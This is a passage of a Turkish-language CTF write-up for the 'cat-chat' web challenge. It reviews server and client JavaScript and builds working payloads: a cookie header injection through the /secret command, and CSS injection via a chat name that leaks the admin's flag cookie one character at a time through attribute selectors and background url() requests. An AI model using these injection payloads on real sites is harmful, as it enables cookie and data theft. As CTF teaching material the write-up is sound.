+</span><span style="color:#657b83;">        response = await admin.</span><span style="color:#b58900;">report</span><span style="color:#657b83;">(arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">, ip, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">https://</span><span style="color:#657b83;">${req.headers.host}</span><span style="color:#2aa198;">/room/</span><span style="color:#657b83;">${room}</span><span style="color:#2aa198;">/</span><span style="color:#839496;">`</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    }
+</span><span style="color:#657b83;">  }
+</span><span style="color:#657b83;">  </span><span style="color:#859900;">console</span><span style="color:#657b83;">.</span><span style="color:#859900;">log</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#657b83;">${room}</span><span style="color:#2aa198;"> --&gt; (</span><span style="color:#657b83;">${name}</span><span style="color:#2aa198;">):</span><span style="color:#839496;">`</span><span style="color:#657b83;">, response)
+</span><span style="color:#657b83;">  res.</span><span style="color:#b58900;">json</span><span style="color:#657b83;">(response);
+</span><span style="color:#657b83;">  res.</span><span style="color:#b58900;">status</span><span style="color:#657b83;">(</span><span style="color:#6c71c4;">200</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">  res.</span><span style="color:#b58900;">end</span><span style="color:#657b83;">();
+</span><span style="color:#657b83;">});
+</span>
+</code></pre>
+<p>Geldik mesajlar kısmına.</p>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;"> </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(req.headers.referer </span><span style="color:#859900;">|| </span><span style="color:#839496;">&#39;&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#859900;">^</span><span style="color:#2aa198;">https</span><span style="color:#859900;">?</span><span style="color:#2aa198;">:</span><span style="color:#dc322f;">\/\/</span><span style="color:#839496;">/</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">startsWith</span><span style="color:#657b83;">(req.headers.host)) {
+</span><span style="color:#657b83;">    response = {type: </span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">error</span><span style="color:#839496;">&quot;</span><span style="color:#657b83;">, error: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">CSRF protection error</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">};
+</span><span style="color:#657b83;"> }
+</span>
+</code></pre>
+<p><strong>Refer</strong> based CSRF koruması varmış.</p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#859900;">else if </span><span style="color:#657b83;">(msg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">0</span><span style="color:#268bd2;">] </span><span style="color:#657b83;">!= </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">) {
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">broadcast</span><span style="color:#657b83;">(room, {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">msg</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, name, msg});
+</span><span style="color:#657b83;">}
+</span>
+</code></pre>
+<p>Eğer mesaj <strong>/</strong> ile başlamıyorsa yani komut değilse mesaj olarak yolluyor.</p>
+<p>Geldik eğer komutsa kısmına</p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#657b83;">case </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/name</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">:
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(arg = msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#dc322f;">\/</span><span style="color:#2aa198;">name (</span><span style="color:#cb4b16;">.</span><span style="color:#859900;">+</span><span style="color:#2aa198;">)</span><span style="color:#839496;">/</span><span style="color:#657b83;">))) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">    response = {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">rename</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, name: arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">};
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">broadcast</span><span style="color:#657b83;">(room, {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">name</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, name: arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">old: name});
+</span>
+</code></pre>
+<p><strong>/name</strong> ise isim değiştir</p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#657b83;">case </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/ban</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">:
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(arg = msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#dc322f;">\/</span><span style="color:#2aa198;">ban (</span><span style="color:#cb4b16;">.</span><span style="color:#859900;">+</span><span style="color:#2aa198;">)</span><span style="color:#839496;">/</span><span style="color:#657b83;">))) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">req.admin) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">broadcast</span><span style="color:#657b83;">(room, {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">ban</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, name: arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">});
+</span>
+</code></pre>
+<p><strong>/ban xxx</strong> ise ve banlamak isteyen kişi <strong>admin</strong> ise <strong>xx</strong> i banla</p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#657b83;">case </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/secret</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">:
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(arg = msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#dc322f;">\/</span><span style="color:#2aa198;">secret (</span><span style="color:#cb4b16;">.</span><span style="color:#859900;">+</span><span style="color:#2aa198;">)</span><span style="color:#839496;">/</span><span style="color:#657b83;">))) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">    res.</span><span style="color:#b58900;">setHeader</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">Set-Cookie</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">flag=</span><span style="color:#839496;">&#39; </span><span style="color:#657b83;">+ arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">] </span><span style="color:#657b83;">+ </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">; Path=/; Max-Age=31536000</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    response = {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">secret</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">};
+</span>
+</code></pre>
+<p><strong>/secret xxx</strong> ise <strong>flag</strong> cookiesini <strong>xxx</strong> olarak set et.</p>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">case </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/report</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">:
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(arg = msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#dc322f;">\/</span><span style="color:#2aa198;">report (</span><span style="color:#cb4b16;">.</span><span style="color:#859900;">+</span><span style="color:#2aa198;">)</span><span style="color:#839496;">/</span><span style="color:#657b83;">))) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">    </span><span style="color:#268bd2;">var </span><span style="color:#657b83;">ip = req.headers</span><span style="color:#268bd2;">[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">x-forwarded-for</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">    ip = ip </span><span style="color:#859900;">? </span><span style="color:#657b83;">ip.</span><span style="color:#b58900;">split</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">,</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">)</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">0</span><span style="color:#268bd2;">] </span><span style="color:#859900;">: </span><span style="color:#657b83;">req.connection.remoteAddress;
+</span><span style="color:#657b83;">    response = await admin.</span><span style="color:#b58900;">report</span><span style="color:#657b83;">(arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">, ip, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">https://</span><span style="color:#657b83;">${req.headers.host}</span><span style="color:#2aa198;">/room/</span><span style="color:#657b83;">${room}</span><span style="color:#2aa198;">/</span><span style="color:#839496;">`</span><span style="color:#657b83;">);
+</span>
+</code></pre>
+<p><strong>/report</strong> ise <strong>admin</strong>'i çağır. (<strong>x-forwarded-for</strong> niye konulmuş bir fikrim yok ama sanırım ki içerideki reverse proxyden dolayı)</p>
+<p>Buraya kadar öğrendiklerimiz</p>
+<ul>
+<li>İsim değiştirebildiğimiz.</li>
+<li><strong>style-src unsafe-inline</strong>'den dolayı inline şekilde style değişikliği yapabildiğimiz.</li>
+<li>flag'in /secret komutuna bağlı olduğu</li>
+</ul>
+<h4>Client-side kod inceleme</h4>
+<p>Geldik Client-side kod inceleme kısmına <a href="https://github.com/CyberSaxosTiGER/CyberSaxosTiGER.github.io/blob/master/files/cat-chat.js">cat-chat.js</a></p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#268bd2;">let </span><span style="color:#b58900;">esc </span><span style="color:#657b83;">= (</span><span style="color:#268bd2;">str</span><span style="color:#657b83;">) </span><span style="color:#268bd2;">=&gt; </span><span style="color:#657b83;">str.</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#2aa198;">&lt;</span><span style="color:#839496;">/</span><span style="color:#859900;">g</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">&amp;lt;</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#2aa198;">&gt;</span><span style="color:#839496;">/</span><span style="color:#859900;">g</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">&amp;gt;</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#2aa198;">&quot;</span><span style="color:#839496;">/</span><span style="color:#859900;">g</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">&amp;quot;</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#2aa198;">&#39;</span><span style="color:#839496;">/</span><span style="color:#859900;">g</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">&amp;apos;</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span>
+</code></pre>
+<p>Escape fonksiyonuna göre <strong>['&gt;','&lt;',' &quot; ',' ' ']</strong> karakterleri yasaklı. Bu kısımıda not edelim.</p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#268bd2;">function </span><span style="color:#b58900;">handle</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">data</span><span style="color:#657b83;">) {
+</span><span style="color:#657b83;">  ({
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">undefined</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">data</span><span style="color:#657b83;">) {},
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">error</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">data</span><span style="color:#657b83;">) { </span><span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#2aa198;">Something went wrong :/ Check the console for error message.</span><span style="color:#839496;">`</span><span style="color:#657b83;">); </span><span style="color:#859900;">console</span><span style="color:#657b83;">.</span><span style="color:#859900;">error</span><span style="color:#657b83;">(data); },
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">name</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">data</span><span style="color:#657b83;">) { </span><span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.old)}</span><span style="color:#2aa198;"> is now known as </span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}</span><span style="color:#839496;">`</span><span style="color:#657b83;">); },
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">rename</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">data</span><span style="color:#657b83;">) { localStorage.name = data.name; },
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">secret</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">data</span><span style="color:#657b83;">) { </span><span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#2aa198;">Successfully changed secret to &lt;span data-secret=&quot;</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(</span><span style="color:#b58900;">cookie</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">flag</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">))}</span><span style="color:#2aa198;">&quot;&gt;*****&lt;/span&gt;</span><span style="color:#839496;">`</span><span style="color:#657b83;">); },
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">msg</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">data</span><span style="color:#657b83;">) {
+</span><span style="color:#657b83;">      </span><span style="color:#268bd2;">let </span><span style="color:#657b83;">you = (data.name == localStorage.name) </span><span style="color:#859900;">? </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;"> (you)</span><span style="color:#839496;">&#39; </span><span style="color:#859900;">: </span><span style="color:#839496;">&#39;&#39;</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">      </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">you </span><span style="color:#859900;">&amp;&amp; </span><span style="color:#657b83;">data.msg == </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">Hi all</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">) </span><span style="color:#b58900;">send</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">Hi</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">      </span><span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#2aa198;">&lt;span data-name=&quot;</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}</span><span style="color:#2aa198;">&quot;&gt;</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}${you}</span><span style="color:#2aa198;">&lt;/span&gt;: &lt;span&gt;</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.msg)}</span><span style="color:#2aa198;">&lt;/span&gt;</span><span style="color:#839496;">`</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    },
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">ban</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">data</span><span style="color:#657b83;">) {
+</span><span style="color:#657b83;">      </span><span style="color:#859900;">if </span><span style="color:#657b83;">(data.name == localStorage.name) {
+</span><span style="color:#657b83;">        </span><span style="color:#859900;">document</span><span style="color:#657b83;">.cookie = </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">banned=1; Path=/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">        sse.</span><span style="color:#859900;">close</span><span style="color:#657b83;">();
+</span><span style="color:#657b83;">        </span><span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#2aa198;">You have been banned and from now on won&#39;t be able to receive and send messages.</span><span style="color:#839496;">`</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">      } </span><span style="color:#859900;">else </span><span style="color:#657b83;">{
+</span><span style="color:#657b83;">        </span><span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}</span><span style="color:#2aa198;"> was banned.&lt;style&gt;span[data-name^=</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}</span><span style="color:#2aa198;">] { color: red; }&lt;/style&gt;</span><span style="color:#839496;">`</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">      }
+</span><span style="color:#657b83;">    },
+</span><span style="color:#657b83;">  })</span><span style="color:#268bd2;">[</span><span style="color:#657b83;">data.type</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">(data);
+</span><span style="color:#657b83;">}
+</span>
+</code></pre>
+<p>Bizi sadece <strong>/name</strong>, <strong>/report</strong> ve <strong>/ban</strong> ilgilendiriyor demiştik.</p>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
+<span style="color:#b58900;">ban</span><span style="color:#657b83;">(data) {
+</span><span style="color:#657b83;">  </span><span style="color:#859900;">if </span><span style="color:#657b83;">(data.name == localStorage.name) {
+</span><span style="color:#859900;">document</span><span style="color:#657b83;">.cookie = </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">banned=1; Path=/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">sse.</span><span style="color:#859900;">close</span><span style="color:#657b83;">();
+</span><span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#2aa198;">You have been banned and from now on won&#39;t be able to receive and send messages.</span><span style="color:#839496;">`</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">  } </span><span style="color:#859900;">else </span><span style="color:#657b83;">{
+</span><span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}</span><span style="color:#2aa198;"> was banned.&lt;style&gt;span[data-name^=</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}</span><span style="color:#2aa198;">] { color: red; }&lt;/style&gt;</span><span style="color:#839496;">`</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">  }
+</span><span style="color:#657b83;">}
+</span>
+</code></pre>
+<p><strong>CSP</strong>'yi hatırlayalım. <strong>style-src</strong>, <strong>unsafe-inline</strong> olarak ayarlanmış.</p>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;"> </span><span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#2aa198;">Successfully changed secret to &lt;span data-secret=&quot;</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(</span><span style="color:#b58900;">cookie</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">flag</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">))}</span><span style="color:#2aa198;">&quot;&gt;*****&lt;/span&gt;</span><span style="color:#839496;">`
+</span>
+</code></pre>
+<p><strong>/secret</strong> ile <strong>flag</strong>'i değiştirdiğimiz zaman <strong>flag</strong> değeri <strong>data-secret</strong> attribute'una değişen hali yazılıyormuş.</p>
+<p><img src="cat-chat3.png" alt="nou" /></p>
+<p>Bunuda köşeye yazalım</p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#b58900;">display</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}</span><span style="color:#2aa198;"> was banned.&lt;style&gt;span[data-name^=</span><span style="color:#657b83;">${</span><span style="color:#b58900;">esc</span><span style="color:#657b83;">(data.name)}</span><span style="color:#2aa198;">] { color: red; }&lt;/style&gt;</span><span style="color:#839496;">`</span><span style="color:#657b83;">);
+</span>
+</code></pre>
+<p><strong>span[data-name^=${esc(data.name)}]</strong> temizinden bir <strong>CSS injection</strong></p>
+<p>Deneme senaryosu</p>
+<ul>
+<li>kullanıcı ismini diye değiştirsin <strong>nendo ] {background:url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=zzzzz%20you%20xxxx);}</strong></li>
+<li>diğer kullanıcı report etsin</li>
+<li>kullanıcı <strong>dog</strong> yazsın</li>
+</ul>
+<p><img src="cat-chat4.png" alt="yrmm" /></p>
+<p>Denememiz başarı oldu</p>
+<p>Flag değerini <strong>data-secret</strong> attribute'una değişen hali yazdığını hatırlayalım.</p>
+<p><strong>flag</strong>'i değiştirmeden <strong>data-secret</strong> değerine yazdırmamız gerekiyor.</p>
+<p><strong>server.js</strong>'e tekrar dönüp bakalım</p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#657b83;">case </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/secret</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">:
+</span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(arg = msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#dc322f;">\/</span><span style="color:#2aa198;">secret (</span><span style="color:#cb4b16;">.</span><span style="color:#859900;">+</span><span style="color:#2aa198;">)</span><span style="color:#839496;">/</span><span style="color:#657b83;">))) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">res.</span><span style="color:#b58900;">setHeader</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">Set-Cookie</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">flag=</span><span style="color:#839496;">&#39; </span><span style="color:#657b83;">+ arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">] </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">; Path=/; Max-Age=31536000</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">response = {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">secret</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">};
+</span>
+</code></pre>
+<p><strong>Header</strong> set ederken girdi kontrolü yapmıyor. Başka domaine cookie'yi set edebiliriz.</p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">/secret yeniSecret; Domain=x
+</span>
+</code></pre>
+<p>Dediğimizi var sayarsak. olmayan bir domaine set edecek bundan dolayi cookie değişmeyecek.</p>
+<p><img src="cat-chat5.png" alt="nou" /></p>
+<p>Şimdi sıra <strong>data-secret</strong> değerini okumakta.</p>
+<p>bknz. <a href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense"><strong>CSS</strong> ile veri çalmak</a></p>
+<p>her karakteri backroud resmi seklinde mesaj yollamasını sağlayacağız. <a href="https://www.w3schools.com/cssref/css_selectors.asp"><strong>CSS Selector</strong> </a> ile durmadan ilk karakteri kontrol etmemiz gerekiyor</p>
+<pre style="background-color:#fdf6e3;" lang="css"><code>
+<span style="color:#657b83;">/name 4d4] {
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">background</span><span style="color:#657b83;">: </span><span style="color:#859900;">url</span><span style="color:#657b83;">(</span><span style="color:#2aa198;">/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=/secret dummy; Domain=d2gn834g5z45m9h14fkk5rbh</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">}
+</span><span style="color:#657b83;">
+</span><span style="color:#b58900;">span</span><span style="color:#657b83;">[</span><span style="color:#b58900;">data-secret</span><span style="color:#859900;">^=</span><span style="color:#2aa198;">a</span><span style="color:#657b83;">] {
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">background</span><span style="color:#657b83;">: </span><span style="color:#859900;">url</span><span style="color:#657b83;">(</span><span style="color:#2aa198;">/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=a</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">}
+</span><span style="color:#657b83;">...
+</span><span style="color:#657b83;">
+</span><span style="color:#b58900;">span</span><span style="color:#657b83;">[</span><span style="color:#b58900;">data-secret</span><span style="color:#859900;">^=</span><span style="color:#2aa198;">z</span><span style="color:#657b83;">] {
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">background</span><span style="color:#657b83;">: </span><span style="color:#859900;">url</span><span style="color:#657b83;">(</span><span style="color:#2aa198;">/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=z</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">}
+</span><span style="color:#657b83;">
+</span><span style="color:#b58900;">span</span><span style="color:#657b83;">[</span><span style="color:#b58900;">data-secret</span><span style="color:#859900;">^=</span><span style="color:#2aa198;">A</span><span style="color:#657b83;">] {
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">background</span><span style="color:#657b83;">: </span><span style="color:#859900;">url</span><span style="color:#657b83;">(</span><span style="color:#2aa198;">/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=A</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">}
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">...
+</span><span style="color:#657b83;">
+</span><span style="color:#b58900;">span</span><span style="color:#657b83;">[</span><span style="color:#b58900;">data-secret</span><span style="color:#859900;">^=</span><span style="color:#2aa198;">Z</span><span style="color:#657b83;">] {
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">background</span><span style="color:#657b83;">: </span><span style="color:#859900;">url</span><span style="color:#657b83;">(</span><span style="color:#2aa198;">/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=Z</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">}
+</span><span style="color:#657b83;">
+</span><span style="color:#b58900;">span</span><span style="color:#657b83;">[</span><span style="color:#b58900;">data-secret</span><span style="color:#859900;">^=</span><span style="color:#2aa198;">0</span><span style="color:#657b83;">] {
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">background</span><span style="color:#657b83;">: </span><span style="color:#859900;">url</span><span style="color:#657b83;">(</span><span style="color:#2aa198;">/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=0</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">}
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">...
+</span><span style="color:#657b83;">
+</span><span style="color:#b58900;">span</span><span style="color:#657b83;">[</span><span style="color:#b58900;">data-secret</span><span style="color:#859900;">^=</span><span style="color:#2aa198;">9</span><span style="color:#657b83;">] {
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">background</span><span style="color:#657b83;">: </span><span style="color:#859900;">url</span><span style="color:#657b83;">(</span><span style="color:#2aa198;">/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=9</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">}
+</span><span style="color:#657b83;">
+</span><span style="color:#b58900;">span</span><span style="color:#657b83;">[</span><span style="color:#b58900;">data-secret</span><span style="color:#859900;">^=</span><span style="color:#2aa198;">_</span><span style="color:#657b83;">] {
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">background</span><span style="color:#657b83;">: </span><span style="color:#859900;">url</span><span style="color:#657b83;">(</span><span style="color:#2aa198;">/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&amp;msg=_</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">}
+</span>
+</code></pre>
